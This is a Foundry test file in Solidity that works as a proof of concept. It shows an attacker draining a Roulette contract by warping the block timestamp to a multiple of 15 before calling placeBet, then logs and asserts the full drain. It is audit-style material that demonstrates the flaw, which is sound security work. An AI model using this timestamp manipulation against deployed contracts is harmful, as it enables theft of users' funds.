// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/roulette.sol";

contract RouletteExploitTest is Test {
    Roulette public roulette;
    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.prank(owner);
        roulette = new Roulette();
    }

    function testPlaceBetDrain() public {
        // Fund the contract
        vm.prank(owner);
        roulette.deposit{value: 50 ether}();
        
        console2.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(roulette).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 totalWinnersBefore = roulette.totalWinners();
        console2.log("Contract balance (before):    ", contractBalanceBefore);
        console2.log("Attacker balance (before):    ", attackerBalanceBefore);
        console2.log("Total winners (before):       ", totalWinnersBefore);
        
        console2.log("");
        console2.log("--- Trigger: Attacker places bet ---");
        // Set timestamp to a multiple of 15 to trigger winning condition
        vm.warp(15);
        
        vm.prank(attacker);
        roulette.placeBet{value: 10 ether}();
        console2.log("Attacker executed placeBet");
        
        console2.log("");
        console2.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(roulette).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 totalWinnersAfter = roulette.totalWinners();
        console2.log("Contract balance (after):     ", contractBalanceAfter);
        console2.log("Attacker balance (after):     ", attackerBalanceAfter);
        console2.log("Total winners (after):        ", totalWinnersAfter);
        
        console2.log("");
        console2.log("--- Differential Comparison ---");
        console2.log("Contract balance change:     ", int256(contractBalanceAfter) - int256(contractBalanceBefore));
        console2.log("Attacker balance change:     ", attackerBalanceAfter - attackerBalanceBefore);
        console2.log("Winner count change:         ", totalWinnersAfter - totalWinnersBefore);
        
        bool contractDrained = contractBalanceAfter == 0;
        bool attackerProfit = attackerBalanceAfter > attackerBalanceBefore + 49 ether; // >49 ETH profit
        bool winnerCountIncreased = totalWinnersAfter == totalWinnersBefore + 1;
        
        console2.log("");
        if (contractDrained && attackerProfit && winnerCountIncreased) {
            console2.log("Verdict: Vulnerability Exists - Contract drained, winnings extracted, and winner count increased");
            console2.log("Vulnerability Exists: Attacker successfully exploited the winning condition");
        } else {
            console2.log("Verdict: Vulnerability not Exist - Exploit conditions not met");
            console2.log("Vulnerability not Exist: Attack failed to meet all exploit conditions");
        }

        // Original assertions (preserved)
        assertEq(contractBalanceAfter, 0, "Contract should be drained");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + contractBalanceBefore, "Attacker should receive full contract balance");
        assertEq(totalWinnersAfter, 1, "Total winner count should be updated");
    }
}